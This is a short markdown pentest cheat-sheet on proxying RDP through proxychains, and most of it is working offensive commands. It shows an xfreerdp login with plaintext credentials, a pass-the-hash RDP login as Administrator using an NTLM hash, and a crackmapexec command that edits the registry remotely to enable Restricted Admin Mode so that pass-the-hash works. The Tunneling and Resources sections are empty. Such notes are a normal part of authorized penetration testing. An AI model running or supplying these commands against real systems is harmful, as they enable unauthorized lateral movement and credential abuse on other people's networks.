# Proxying / Tunneling Technics

## Tunneling

## Proxying
#### RDP protocol
Proxy RDP protocol using xfreerdp
```
proxychains xfreerdp /v:192.168.0.10 /u:jdoe /p:Pass123 /d:corp.company.local /dynamic-resolution +clipboard
```

Proxy RDP protocol using [xfreerdp](https://www.kali.org/tools/freerdp2/) and use NTLM hash to authenticate (PTH RDP)
- System need to have *Restricted Admin Mode* enabled.  
- If not enable you will get an error : “*Account Restrictions are preventing this user from signing in.*” 
- Restricted Admin Mode is disabled by default.
```
proxychains xfreerdp /v:192.168.0.10 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
```

Enable *Restricted Admin Mode* (need admin priv)
```
crackmapexec smb 192.168.0.10 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

## Resources